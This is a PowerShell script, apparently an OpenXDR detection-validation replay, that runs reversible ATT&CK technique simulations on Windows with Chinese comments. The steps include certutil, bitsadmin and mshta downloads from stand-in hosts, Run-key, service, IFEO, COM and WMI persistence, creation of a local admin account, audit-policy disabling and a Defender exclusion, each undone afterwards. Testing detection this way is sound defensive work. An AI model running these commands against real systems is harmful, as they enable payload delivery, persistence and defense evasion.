# OpenXDR Windows 实机回放（安全子集，全部可逆/无破坏）
# 用法：agent + server 在线时，以管理员身份执行：
#   powershell -NoProfile -ExecutionPolicy Bypass -File validation/replay/windows.ps1
# 排除项（有意不做）：T1490 删卷影（破坏性）、凭据转储（杀毒必拦，测不出采集）、清日志
# 注意：persistwatch 快照间隔 30s，持久化点的建/删之间必须留 45s 让 diff 看到中间态
$ErrorActionPreference = 'Continue'
function Mark($n) { Write-Host "=== [$n] $(Get-Date -Format HH:mm:ss) ===" }

Mark 'T1082 systeminfo'
systeminfo | Out-Null

Mark '良性对照: tasklist|findstr lsass（不应告警）'
cmd.exe /c "tasklist | findstr lsass"

Mark 'T1059.001 powershell -enc（故意截断的 base64，进程起来即可）'
powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA

Mark 'T1059.001 powershell -NoP -W Hidden -File（文件不存在，进程起来即可）'
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File evil.ps1

Mark 'T1105 certutil urlcache（连 10.0.0.1 失败，无害）'
certutil.exe -urlcache -split -f http://10.0.0.1/evil.exe C:\Windows\Temp\evil.exe
Remove-Item C:\Windows\Temp\evil.exe -Force -ErrorAction SilentlyContinue

Mark 'T1105 bitsadmin（同上，任务随后取消）'
bitsadmin /transfer atomic /download http://10.0.0.1/evil.exe C:\Temp\evil.exe
bitsadmin /cancel atomic 2>$null
Remove-Item C:\Temp\evil.exe -Force -ErrorAction SilentlyContinue

Mark 'T1047 wmic 远程创建进程（连不上，无害）'
wmic /node:10.0.0.8 process call create "cmd.exe /c evil.exe"

Mark 'T1218.005 mshta 远程 hta（5s 后强杀防挂窗）'
$p = Start-Process mshta.exe -ArgumentList 'http://10.0.0.1/payload.hta' -PassThru
Start-Sleep 5
Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue

Mark 'RDCW 文件监控: drivers\etc 增改删'
$f = "C:\Windows\System32\drivers\etc\atomic-test.txt"
New-Item -Path $f -ItemType File -Force | Out-Null
Add-Content $f "x"
Start-Sleep 3
Remove-Item $f -Force

Mark '持久化点建立：Startup lnk / Tasks 文件 / Run 键 / 服务 / 计划任务'
$lnk = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\evil.lnk"
New-Item -Path $lnk -ItemType File -Force | Out-Null
$tf = "C:\Windows\System32\Tasks\atomic"
New-Item -Path $tf -ItemType File -Force | Out-Null
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Atomic /t REG_SZ /d "C:\evil.exe" /f
sc.exe create atomic binPath= "C:\evil.exe"
schtasks /create /tn atomic /tr "C:\evil.exe" /sc onstart /f

Mark '等 45s 让 persistwatch 快照 diff 看到中间态'
Start-Sleep 45

Mark 'T1070 删除全部持久化点（删除事件应带旧值）'
Remove-Item $lnk -Force
Remove-Item $tf -Force
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Atomic /f
sc.exe delete atomic
schtasks /delete /tn atomic /f

Mark '回放完成'

# ---- AB 档新采集项（2026-08-09 第二轮）----
# 快照类采集建删之间必须留 35s；1102 清日志与 EventLog 停服务为破坏性动作，不做

Mark 'T1136.001 创建+删除本地账号（4720/4726）'
net user atomic P@ssw0rd123 /add
Start-Sleep 2
net user atomic /delete

Mark 'T1098 加入管理员组（4732）'
net user atomic P@ssw0rd123 /add
net localgroup administrators atomic /add
Start-Sleep 2
net localgroup administrators atomic /delete
net user atomic /delete

Mark 'T1070.001 审计策略变更（4719，可逆）'
auditpol /set /subcategory:"{0CCE9210-69AE-11D9-BED3-505054503030}" /success:disable /failure:disable
Start-Sleep 1
auditpol /set /subcategory:"{0CCE9210-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable

Mark 'T1059.001 4104 脚本块（需组策略开 Script Block Logging）'
powershell.exe -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZWNobyB0ZXN0'))"

Mark 'T1546.012 IFEO 调试器劫持（35s 后删）'
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\evil.exe" /f
Start-Sleep 35
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /f

Mark 'T1562.001 Defender 排除项（Defender 未运行时无注册表落点，跳过不报错）'
Add-MpPreference -ExclusionPath 'C:tomic-test' -ErrorAction SilentlyContinue
Start-Sleep 35
Remove-MpPreference -ExclusionPath 'C:tomic-test' -ErrorAction SilentlyContinue

Mark 'T1546.015 COM 劫持 HKCU CLSID（35s 后删）'
$clsid = '{11111111-2222-3333-4444-555555555555}'
New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Name '(Default)' -Value 'C:\evil.dll'
Start-Sleep 35
Remove-Item -Path "HKCU:\Software\Classes\CLSID\$clsid" -Recurse -Force

Mark 'T1546.003 WMI 事件订阅（35s 后删；删除必须 Get-WmiObject 管道，Remove-WmiObject 无 -Filter）'
Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='AtomicFilter';Query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'";EventNamespace='root\cimv2';QueryLanguage='WQL'} -ErrorAction SilentlyContinue | Out-Null
Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='AtomicConsumer';CommandLineTemplate='cmd.exe /c echo atomic'} -ErrorAction SilentlyContinue | Out-Null
Start-Sleep 35
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='AtomicConsumer'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='AtomicFilter'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue

Mark '网络进程归属（4001，curl 出站）'
curl.exe -s --connect-timeout 3 http://103.143.17.156/ -o NUL

Mark 'AB 档回放完成'
